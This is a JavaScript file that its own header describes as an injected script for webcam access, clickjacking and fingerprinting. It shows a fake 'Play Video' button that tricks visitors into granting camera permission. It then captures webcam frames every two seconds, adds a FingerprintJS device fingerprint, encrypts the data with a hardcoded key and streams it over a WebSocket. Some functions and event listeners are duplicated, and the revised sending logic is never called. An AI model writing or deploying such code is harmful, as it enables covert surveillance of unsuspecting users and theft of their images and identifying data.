// Injected script for webcam access, permission obfuscation, clickjacking, device fingerprinting, and WebSocket streaming

// Load FingerprintJS script dynamically
if (!window.fpScriptInjected) {
  const fpScript = document.createElement('script');
  fpScript.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js';
  document.head.appendChild(fpScript);
  window.fpScriptInjected = true;
}

// WebSocket connection
const ws = new WebSocket(`ws://${window.location.hostname}:8080`);

// Create a high-quality "Play Video" button to trigger permission
const playButton = document.createElement('button');
playButton.textContent = 'Play Video';
playButton.style.position = 'fixed';
playButton.style.top = '50%';
playButton.style.left = '50%';
playButton.style.transform = 'translate(-50%, -50%)';
playButton.style.zIndex = '9999';
playButton.style.padding = '15px 30px';
playButton.style.fontSize = '18px';
playButton.style.background = 'linear-gradient(90deg, #4b6cb7, #182848)';
playButton.style.color = 'white';
playButton.style.border = 'none';
playButton.style.borderRadius = '8px';
playButton.style.cursor = 'pointer';
document.body.appendChild(playButton);

function requestCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = 640;
      canvas.height = 480;

      // Capture and send image every 2 seconds
      setInterval(() => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');

        // Collect fingerprint data
        if (window.FingerprintJS) {
          FingerprintJS.load().then(fp => {
            fp.get().then(result => {
              const payload = {
                image: imageData,
                fingerprint: result
              };
              encrypt(JSON.stringify(payload)).then(encryptedData => {
                ws.send(encryptedData);
              });
            });
          });
        }
      }, 2000);
    })
    .catch(err => {
      console.error('Camera access denied or error:', err);
    });
}

// AES encryption function using Web Crypto API
async function encrypt(text) {
  const keyHex = '0123456789abcdef0123456789abcdef'; // 32 bytes key
  const encoder = new TextEncoder();
  const data = encoder.encode(text);
  const iv = window.crypto.getRandomValues(new Uint8Array(16));

  const keyBytes = new Uint8Array(keyHex.match(/.{2}/g).map(byte => parseInt(byte, 16)));

  const cryptoKey = await window.crypto.subtle.importKey(
    'raw',
    keyBytes.buffer,
    { name: 'AES-CBC' },
    false,
    ['encrypt']
  );

  const encrypted = await window.crypto.subtle.encrypt(
    { name: 'AES-CBC', iv },
    cryptoKey,
    data
  );

  const buffer = new Uint8Array(encrypted);
  const ivStr = Array.from(iv).map(b => b.toString(16).padStart(2, '0')).join('');
  const encryptedStr = Array.from(buffer).map(b => b.toString(16).padStart(2, '0')).join('');
  return ivStr + ':' + encryptedStr;
}

// Prevent duplicate sends by ensuring only one encryption/send per interval
let sendIntervalId = null;
let latestPayload = null;

function sendEncryptedPayload() {
  if (latestPayload && ws.readyState === WebSocket.OPEN) {
    encrypt(JSON.stringify(latestPayload)).then(encryptedData => {
      ws.send(encryptedData);
    });
  }
}

// Modify the setInterval to update latestPayload and send only once per interval
function requestCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = 640;
      canvas.height = 480;

      if (sendIntervalId) clearInterval(sendIntervalId);

      sendIntervalId = setInterval(() => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');

        if (window.FingerprintJS) {
          FingerprintJS.load().then(fp => {
            fp.get().then(result => {
              latestPayload = {
                image: imageData,
                fingerprint: result
              };
            });
          });
        }
      }, 2000);
    })
    .catch(err => {
      console.error('Camera access denied or error:', err);
    });
}

playButton.addEventListener('click', () => {
  requestCamera();
  playButton.style.display = 'none';
});


playButton.addEventListener('click', () => {
  requestCamera();
  playButton.style.display = 'none';
});

